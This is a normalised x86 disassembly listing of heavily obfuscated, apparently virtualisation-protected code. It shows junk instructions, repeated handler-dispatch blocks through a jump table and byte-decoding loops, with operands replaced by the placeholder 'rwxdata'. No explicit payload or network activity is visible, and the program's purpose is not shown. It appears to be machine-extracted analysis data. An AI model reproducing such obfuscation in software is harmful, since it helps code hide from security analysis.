rcl dl cl
adc dl 0x38
ror dl cl
pushad
xor bl al
jmp rwxdata
mov dx [ ebp ]
mov [ esp + 0x1c ] 0xbe98
jmp rwxdata
pushad
call sub_51172f
pushfd
push [ rwxdata ]
pop [ esp + 0x3c ]
push 0xb8d58b8b
mov [ esp + 0x3c ] 0x0
pushfd
push [ esp ]
lea esp [ esp + 0x44 ]
jmp rwxdata
ror esi cl
cmc
mov esi [ esp + 0x30 ]
shl bp 0x1
bswap esi
ror al 0x7
xchg bp di
shl di cl
add esi 0x9dcffc04
bt bp 0x9
cmc
pushfd
rol esi 0x10
rcr bp 0xf
xor bx 0x16e4
lea ebp [ esp + 0x4 ]
dec bl
or di bp
sub esp 0xbc
inc bl
mov edi esp
xadd ch bl
xadd bl al
stc
adc bl 0xcc
mov ebx esi
btr ecx eax
pushad
jmp rwxdata
neg cx
add esi [ ebp ]
sub esp 0xffffffe0
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_513319
mov [ esp ] esi
pushfd
mov [ esp ] si
mov [ esp ] edi
pushfd
jmp rwxdata
mov [ esp ] ecx
pushad
pushad
call sub_511e92
lea esp [ esp + 0x44 ]
jpo rwxdata
pushfd
push 0x3dfecbd
push [ rwxdata ]
pop [ esp + 0x4 ]
mov [ esp ] 0x324a258b
pushfd
jmp rwxdata
push [ rwxdata ]
pushad
pushad
mov [ esp + 0x3c ] 0x0
push 0xae8489b1
push 0x410356df
mov [ esp + 0x8 ] 0x59
lea esp [ esp + 0x44 ]
jmp rwxdata
mov [ esp ] 0x7e
mov [ esp + 0x4 ] 0x0
pushfd
push [ esp + 0x4 ]
pushad
lea esp [ esp + 0x2c ]
jmp rwxdata
ror esi cl
cmc
mov esi [ esp + 0x30 ]
shl bp 0x1
bswap esi
ror al 0x7
xchg bp di
shl di cl
add esi 0x9dcffc04
bt bp 0x9
cmc
pushfd
rol esi 0x10
rcr bp 0xf
xor bx 0x16e4
lea ebp [ esp + 0x4 ]
dec bl
or di bp
sub esp 0xbc
inc bl
mov edi esp
xadd ch bl
xadd bl al
stc
adc bl 0xcc
mov ebx esi
btr ecx eax
pushad
jmp rwxdata
neg cx
add esi [ ebp ]
sub esp 0xffffffe0
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_513374
push edi
mov [ esp + 0x4 ] 0xd3
pushfd
pop [ esp + 0x44 ]
push edx
push [ esp + 0x4 ]
mov [ esp ] dh
mov [ esp + 0x48 ] ebx
jmp rwxdata
push [ esp + 0x8 ]
push [ rwxdata ]
pop [ esp + 0x48 ]
jmp rwxdata
mov [ esp + 0x4 ] bp
mov [ esp + 0x44 ] 0x0
pushfd
lea esp [ esp + 0x48 ]
jmp rwxdata
ror esi cl
cmc
mov esi [ esp + 0x30 ]
shl bp 0x1
bswap esi
ror al 0x7
xchg bp di
shl di cl
add esi 0x9dcffc04
bt bp 0x9
cmc
pushfd
rol esi 0x10
rcr bp 0xf
xor bx 0x16e4
lea ebp [ esp + 0x4 ]
dec bl
or di bp
sub esp 0xbc
inc bl
mov edi esp
xadd ch bl
xadd bl al
stc
adc bl 0xcc
mov ebx esi
btr ecx eax
pushad
jmp rwxdata
neg cx
add esi [ ebp ]
sub esp 0xffffffe0
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_5133b2
mov [ esp + 0x30 ] esi
pushfd
pushfd
jmp rwxdata
mov [ esp + 0x34 ] edi
push 0x8c691dd5
push 0x69e8e5c7
mov [ esp + 0x38 ] ecx
pushfd
mov [ esp + 0x38 ] edx
jmp rwxdata
push 0x58a04c24
pushfd
pop [ esp + 0x38 ]
call sub_51355e
sub_5133ed
mov [ esp + 0x4 ] ch
call sub_513725
stc
clc
ror al 0x2
stc
sub esp 0xfffffff8
jae rwxdata
push 0xbcc96712
pushad
call sub_513f54
test al 0x80
mov al [ esi - 0x1 ]
call sub_5139d2
add esi 0xffffffff
test ch 0xd
pushad
stc
add bl al
mov [ esp + 0x8 ] bh
sub ebp 0x2
jmp rwxdata
mov [ esp + 0x4 ] edi
push [ esp ]
mov [ ebp ] ax
mov [ esp + 0x4 ] ah
pushfd
mov [ esp ] bp
pushfd
lea esp [ esp + 0x2c ]
jmp rwxdata
movsx ax cl
cmc
btc ax 0x5
or ax si
lea eax [ edi + 0x50 ]
jmp rwxdata
test dh 0xb2
call sub_511a42
mov [ esp ] 0xee52f1b0
mov [ esp + 0x20 ] edi
push 0xdca92d94
mov [ esp + 0x20 ] ecx
jmp rwxdata
jmp rwxdata
mov [ esp + 0x1c ] edx
mov [ esp ] 0x2aae
jmp rwxdata
push [ esp + 0x8 ]
mov [ esp ] 0xa4
pushfd
pop [ esp + 0x1c ]
mov [ esp + 0x4 ] 0x7927
mov [ esp + 0x18 ] ebx
pushfd
pushfd
jmp rwxdata
push [ rwxdata ]
pop [ esp + 0x1c ]
pushfd
pushfd
mov [ esp + 0x20 ] 0x0
pushfd
pushad
pushfd
lea esp [ esp + 0x48 ]
jmp rwxdata
ror esi cl
cmc
mov esi [ esp + 0x30 ]
shl bp 0x1
bswap esi
ror al 0x7
xchg bp di
shl di cl
add esi 0x9dcffc04
bt bp 0x9
cmc
pushfd
rol esi 0x10
rcr bp 0xf
xor bx 0x16e4
lea ebp [ esp + 0x4 ]
dec bl
or di bp
sub esp 0xbc
inc bl
mov edi esp
xadd ch bl
xadd bl al
stc
adc bl 0xcc
mov ebx esi
btr ecx eax
pushad
jmp rwxdata
neg cx
add esi [ ebp ]
sub esp 0xffffffe0
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_51341b
push [ esp + 0x58 ]
popfd
mov [ esp ] 0x1a
lea esp [ esp + 0x5c ]
jmp rwxdata
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_5134a6
call j_sub_512091
call j_sub_5140cb
mov [ esp + 0x28 ] ecx
jmp rwxdata
pushfd
jmp rwxdata
mov [ esp + 0x28 ] edx
mov [ esp + 0x8 ] cx
pushfd
pushfd
pop [ esp + 0x28 ]
pushfd
lea esp [ esp + 0x2c ]
je rwxdata
pushfd
pushad
call sub_511276
xchg bp ax
pop eax
jmp rwxdata
push edi
pushfd
mov [ esp + 0x4 ] ebx
pushad
mov [ esp + 0x8 ] ax
mov [ esp ] bx
push [ rwxdata ]
pop [ esp + 0x20 ]
pushad
jmp rwxdata
pop ebp
not ch
pop ecx
pushfd
pushfd
pushad
push [ esp + 0x28 ]
retn 0x2c
push [ esp ]
mov [ esp + 0x40 ] 0x0
push [ esp ]
push 0xad29083b
push [ esp + 0x4 ]
lea esp [ esp + 0x4c ]
jmp rwxdata
ror esi cl
cmc
mov esi [ esp + 0x30 ]
shl bp 0x1
bswap esi
ror al 0x7
xchg bp di
shl di cl
add esi 0x9dcffc04
bt bp 0x9
cmc
pushfd
rol esi 0x10
rcr bp 0xf
xor bx 0x16e4
lea ebp [ esp + 0x4 ]
dec bl
or di bp
sub esp 0xbc
inc bl
mov edi esp
xadd ch bl
xadd bl al
stc
adc bl 0xcc
mov ebx esi
btr ecx eax
pushad
jmp rwxdata
neg cx
add esi [ ebp ]
sub esp 0xffffffe0
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_5134c7
push 0x9a03f2a8
mov [ esp ] al
mov [ esp ] ebx
push 0xaafc793
push [ rwxdata ]
pop [ esp ]
pushfd
pushad
pushad
mov [ esp + 0x40 ] 0x0
pushfd
pushfd
lea esp [ esp + 0x48 ]
jmp rwxdata
ror esi cl
cmc
mov esi [ esp + 0x30 ]
shl bp 0x1
bswap esi
ror al 0x7
xchg bp di
shl di cl
add esi 0x9dcffc04
bt bp 0x9
cmc
pushfd
rol esi 0x10
rcr bp 0xf
xor bx 0x16e4
lea ebp [ esp + 0x4 ]
dec bl
or di bp
sub esp 0xbc
inc bl
mov edi esp
xadd ch bl
xadd bl al
stc
adc bl 0xcc
mov ebx esi
btr ecx eax
pushad
jmp rwxdata
neg cx
add esi [ ebp ]
sub esp 0xffffffe0
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_513599
lea esp [ esp + 0x2c ]
jpe rwxdata
cld
cld
cld
push edi
bswap di
std
std
pushad
mov edi eax
mov [ esp ] bh
cld
jmp rwxdata
push edi
movzx di bl
mov edi eax
pushad
std
pushad
cld
push 0x23e5274f
call sub_5121ac
jmp rwxdata
mov [ esp ] bx
cld
pushfd
[ edi ] [ esi ]
pop edi
and si 0x492
bsf di cx
call sub_511bf6
jmp rwxdata
mov [ esp + 0x2c ] edi
pushfd
pushfd
mov [ esp + 0x30 ] ecx
jmp rwxdata
push [ rwxdata ]
pop [ esp + 0x30 ]
call sub_513131
mov [ esp + 0x2c ] edx
push esp
jmp rwxdata
push 0xb196af6
pushfd
pushfd
pop [ esp + 0x34 ]
jmp sub_513c1c
sub_5135bd
call sub_512da3
push [ esp ]
mov [ ebp ] eax
pushfd
push 0x45d15dcd
mov [ esp ] 0x80
mov [ esp + 0x4 ] 0xbf30
lea esp [ esp + 0x50 ]
jmp rwxdata
movsx ax cl
cmc
btc ax 0x5
or ax si
lea eax [ edi + 0x50 ]
jmp rwxdata
test dh 0xb2
call sub_511a42
mov [ esp ] 0xee52f1b0
mov [ esp + 0x20 ] edi
push 0xdca92d94
mov [ esp + 0x20 ] ecx
jmp rwxdata
jmp rwxdata
mov [ esp + 0x1c ] edx
mov [ esp ] 0x2aae
jmp rwxdata
push [ esp + 0x8 ]
mov [ esp ] 0xa4
pushfd
pop [ esp + 0x1c ]
mov [ esp + 0x4 ] 0x7927
mov [ esp + 0x18 ] ebx
pushfd
pushfd
jmp rwxdata
push [ rwxdata ]
pop [ esp + 0x1c ]
pushfd
pushfd
mov [ esp + 0x20 ] 0x0
pushfd
pushad
pushfd
lea esp [ esp + 0x48 ]
jmp rwxdata
ror esi cl
cmc
mov esi [ esp + 0x30 ]
shl bp 0x1
bswap esi
ror al 0x7
xchg bp di
shl di cl
add esi 0x9dcffc04
bt bp 0x9
cmc
pushfd
rol esi 0x10
rcr bp 0xf
xor bx 0x16e4
lea ebp [ esp + 0x4 ]
dec bl
or di bp
sub esp 0xbc
inc bl
mov edi esp
xadd ch bl
xadd bl al
stc
adc bl 0xcc
mov ebx esi
btr ecx eax
pushad
jmp rwxdata
neg cx
add esi [ ebp ]
sub esp 0xffffffe0
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_5135eb
push [ rwxdata ]
pop [ esp + 0x1c ]
call j_sub_5117fc
pushfd
pushad
pushfd
pop [ esp + 0x20 ]
pushfd
pushad
call sub_513887
xor eax ebx
mov [ esp ] 0x53c3
pushad
xor eax 0x46c05fa
push 0x5e070397
neg eax
push 0x76a69fa8
test dl dl
not eax
test di 0x93
xor ebx eax
jmp rwxdata
test di 0x8594
test ebx 0xfef2896b
push eax
sub ebp 0x4
pushfd
jmp rwxdata
mov [ ebp ] eax
mov [ esp ] al
pushfd
lea esp [ esp + 0x40 ]
jmp rwxdata
movsx ax cl
cmc
btc ax 0x5
or ax si
lea eax [ edi + 0x50 ]
jmp rwxdata
test dh 0xb2
call sub_511a42
mov [ esp ] 0xee52f1b0
mov [ esp + 0x20 ] edi
push 0xdca92d94
mov [ esp + 0x20 ] ecx
jmp rwxdata
jmp rwxdata
mov [ esp + 0x1c ] edx
mov [ esp ] 0x2aae
jmp rwxdata
push [ esp + 0x8 ]
mov [ esp ] 0xa4
pushfd
pop [ esp + 0x1c ]
mov [ esp + 0x4 ] 0x7927
mov [ esp + 0x18 ] ebx
pushfd
pushfd
jmp rwxdata
push [ rwxdata ]
pop [ esp + 0x1c ]
pushfd
pushfd
mov [ esp + 0x20 ] 0x0
pushfd
pushad
pushfd
lea esp [ esp + 0x48 ]
jmp rwxdata
ror esi cl
cmc
mov esi [ esp + 0x30 ]
shl bp 0x1
bswap esi
ror al 0x7
xchg bp di
shl di cl
add esi 0x9dcffc04
bt bp 0x9
cmc
pushfd
rol esi 0x10
rcr bp 0xf
xor bx 0x16e4
lea ebp [ esp + 0x4 ]
dec bl
or di bp
sub esp 0xbc
inc bl
mov edi esp
xadd ch bl
xadd bl al
stc
adc bl 0xcc
mov ebx esi
btr ecx eax
pushad
jmp rwxdata
neg cx
add esi [ ebp ]
sub esp 0xffffffe0
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_5136b7
pushfd
jmp rwxdata
mov [ esp + 0x4 ] eax
pushad
push [ esp + 0x8 ]
call sub_51342d
push 0xdfc03682
sub esi 0x2
push [ esp ]
mov [ esp ] sp
add ax 0x9113
mov [ esp ] 0xc1
mov [ esp ] 0xce
stc
clc
add bx ax
call sub_513432
sub_5136bd
pushfd
mov [ esp + 0x40 ] ebx
mov [ esp ] edx
call sub_512280
jmp rwxdata
push 0x9b5db0a5
push [ esp + 0x4 ]
pop [ ebp ]
push [ esp ]
lea esp [ esp + 0xc ]
jmp rwxdata
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_51372e
push [ esp ]
mov [ esp + 0x4 ] esi
call sub_512a67
dec al
clc
mov [ esp ] bh
cmp bh 0x17
xor bl al
stc
clc
stc
mov [ esp ] 0xa8ff46c1
mov al [ eax + edi ]
mov [ esp ] 0xe2
add esi 0xffffffff
stc
pushfd
add esp 0x30
jne rwxdata
cmc
cmc
test edx edx
sub ebp 0x2
jmp rwxdata
clc
sub ebp 0x2
push 0xc43812d5
lea esp [ esp + 0x4 ]
jle rwxdata
pushad
pushfd
call sub_511f83
shl ah cl
aad 0x30
bts ax 0x5
mov eax [ ebp ]
inc dl
and dl bl
mov dl [ ebp + 0x4 ]
cmc
call sub_511849
cmc
cmp bh 0x2c
add ebp 0x6
call sub_5142ab
push ecx
push 0x7c138578
jmp rwxdata
pushfd
mov [ ebp ] ax
mov [ esp ] 0x8a
lea esp [ esp + 0x4 ]
jmp rwxdata
jmp rwxdata
movsx ax cl
cmc
btc ax 0x5
or ax si
lea eax [ edi + 0x50 ]
jmp rwxdata
mov [ ebp ] ax
push eax
mov [ esp + 0x4 ] 0xf7
mov [ esp + 0x4 ] 0xb
pushfd
lea esp [ esp + 0x10 ]
jmp rwxdata
test dh 0xb2
call sub_511a42
mov [ esp ] 0xee52f1b0
mov [ esp + 0x20 ] edi
push 0xdca92d94
mov [ esp + 0x20 ] ecx
jmp rwxdata
jmp rwxdata
mov [ esp + 0x1c ] edx
mov [ esp ] 0x2aae
jmp rwxdata
push [ esp + 0x8 ]
mov [ esp ] 0xa4
pushfd
pop [ esp + 0x1c ]
mov [ esp + 0x4 ] 0x7927
mov [ esp + 0x18 ] ebx
pushfd
pushfd
jmp rwxdata
push [ rwxdata ]
pop [ esp + 0x1c ]
pushfd
pushfd
mov [ esp + 0x20 ] 0x0
pushfd
pushad
pushfd
lea esp [ esp + 0x48 ]
jmp rwxdata
ror esi cl
cmc
mov esi [ esp + 0x30 ]
shl bp 0x1
bswap esi
ror al 0x7
xchg bp di
shl di cl
add esi 0x9dcffc04
bt bp 0x9
cmc
pushfd
rol esi 0x10
rcr bp 0xf
xor bx 0x16e4
lea ebp [ esp + 0x4 ]
dec bl
or di bp
sub esp 0xbc
inc bl
mov edi esp
xadd ch bl
xadd bl al
stc
adc bl 0xcc
mov ebx esi
btr ecx eax
pushad
jmp rwxdata
neg cx
add esi [ ebp ]
sub esp 0xffffffe0
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_5137b9
setge cl
inc al
movsx cx cl
dec cx
neg ch
lea esi [ esi - 0x1 ]
push 0xd7f48b02
sbb ch ah
push [ esp ]
neg al
mov cl 0xb6
ror al 0x2
add cl 0x8b
adc cx dx
sar cl 0x6
add bl al
inc cl
movzx ecx al
stc
mov [ ebp - 0x4 ] ecx
cmp al 0xd
mov [ esp ] si
jmp rwxdata
bt bx 0xd
or ecx ecx
push ebp
push [ esp + 0x4 ]
call sub_511f30
mov [ esp + 0x4 ] ebp
mov [ esp ] 0x99e3
call sub_511716
pushad
jmp rwxdata
mov [ esp + 0x1c ] ebx
call sub_5135eb
sub_513853
call sub_5142ba
cmc
shl al 0x2
bsr dx ax
pushad
mov al [ esi - 0x1 ]
bts edx 0xf
neg edx
pushfd
sub esi 0x1
pushfd
xor al bl
jmp rwxdata
neg al
pushfd
not dh
movzx dx al
dec al
jmp sub_5124fc
sub_513887
call sub_511b1a
shld dx di cl
xchg al dl
mov al [ esi - 0x1 ]
bsr dx cx
adc dl 0x3
xor al bl
movzx dx al
clc
movzx dx dl
bts dx bp
sub al 0x7
jbe rwxdata
not dh
not dh
rcr dh 0x4
bt cx bp
ror al 0x5
setns dh
jmp rwxdata
rcr dh cl
push ebx
ror al 0x5
bswap dx
pushad
mov [ esp ] dh
dec al
sub esp 0xffffffdc
jpe rwxdata
dec al
test bh cl
xor bl al
movzx dx dl
mov dx [ ebp ]
pushfd
dec esi
pushfd
add ebp 0x2
mov [ esp + 0x4 ] bl
push 0xff34980b
mov [ eax + edi ] dl
pushfd
lea esp [ esp + 0x10 ]
jmp rwxdata
rcl dl cl
adc dl 0x38
ror dl cl
pushad
xor bl al
jmp rwxdata
movzx dx al
push 0xa1755e5c
xor bl al
bswap dx
movsx dx al
mov [ esp ] 0xdce4
mov dx [ ebp ]
mov [ esp ] 0xbc
dec esi
cmc
push edi
push esi
add ebp 0x2
mov [ esp + 0x8 ] 0x91
jmp rwxdata
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
mov dx [ ebp ]
mov [ esp + 0x1c ] 0xbe98
jmp rwxdata
mov [ esp + 0x8 ] bp
mov [ eax + edi ] dl
pushfd
lea esp [ esp + 0x10 ]
jmp rwxdata
pushad
call sub_51172f
pushfd
push [ rwxdata ]
pop [ esp + 0x3c ]
push 0xb8d58b8b
mov [ esp + 0x3c ] 0x0
pushfd
push [ esp ]
lea esp [ esp + 0x44 ]
jmp rwxdata
ror esi cl
cmc
mov esi [ esp + 0x30 ]
shl bp 0x1
bswap esi
ror al 0x7
xchg bp di
shl di cl
add esi 0x9dcffc04
bt bp 0x9
cmc
pushfd
rol esi 0x10
rcr bp 0xf
xor bx 0x16e4
lea ebp [ esp + 0x4 ]
dec bl
or di bp
sub esp 0xbc
inc bl
mov edi esp
xadd ch bl
xadd bl al
stc
adc bl 0xcc
mov ebx esi
btr ecx eax
pushad
jmp rwxdata
neg cx
add esi [ ebp ]
sub esp 0xffffffe0
sub_51394f
mov [ esp ] 0xfd
mov [ esp + 0x28 ] edx
mov [ esp ] 0xf1
pushfd
pop [ esp + 0x24 ]
mov [ esp ] bl
pushfd
mov [ esp + 0x24 ] ebx
jmp rwxdata
pushad
jmp rwxdata
lea esp [ esp + 0x44 ]
jpo rwxdata
pushfd
push 0x3dfecbd
push [ rwxdata ]
pop [ esp + 0x4 ]
mov [ esp ] 0x324a258b
pushfd
jmp rwxdata
push [ rwxdata ]
pushad
pushad
mov [ esp + 0x3c ] 0x0
push 0xae8489b1
push 0x410356df
mov [ esp + 0x8 ] 0x59
lea esp [ esp + 0x44 ]
jmp rwxdata
mov [ esp ] 0x7e
mov [ esp + 0x4 ] 0x0
pushfd
push [ esp + 0x4 ]
pushad
lea esp [ esp + 0x2c ]
jmp rwxdata
ror esi cl
cmc
mov esi [ esp + 0x30 ]
shl bp 0x1
bswap esi
ror al 0x7
xchg bp di
shl di cl
add esi 0x9dcffc04
bt bp 0x9
cmc
pushfd
rol esi 0x10
rcr bp 0xf
xor bx 0x16e4
lea ebp [ esp + 0x4 ]
dec bl
or di bp
sub esp 0xbc
inc bl
mov edi esp
xadd ch bl
xadd bl al
stc
adc bl 0xcc
mov ebx esi
btr ecx eax
pushad
jmp rwxdata
neg cx
add esi [ ebp ]
sub esp 0xffffffe0
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_5139d2
test esi 0xd87c590b
stc
bt bx 0x6
sub al bl
pushad
cmc
add al 0x9e
call sub_513a56
dec si
btc si ax
or si 0x4c5
bswap esi
mov esi [ ebp ]
cmp bh cl
cmc
add ebp 0x4
pushad
mov [ esp ] 0x28
pushfd
lea esp [ esp + 0x24 ]
jmp rwxdata
xadd ch bl
xadd bl al
stc
adc bl 0xcc
mov ebx esi
btr ecx eax
pushad
jmp rwxdata
neg cx
add esi [ ebp ]
sub esp 0xffffffe0
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_513a14
mov [ esp + 0x44 ] 0x0
push esi
push 0xcfdb5f40
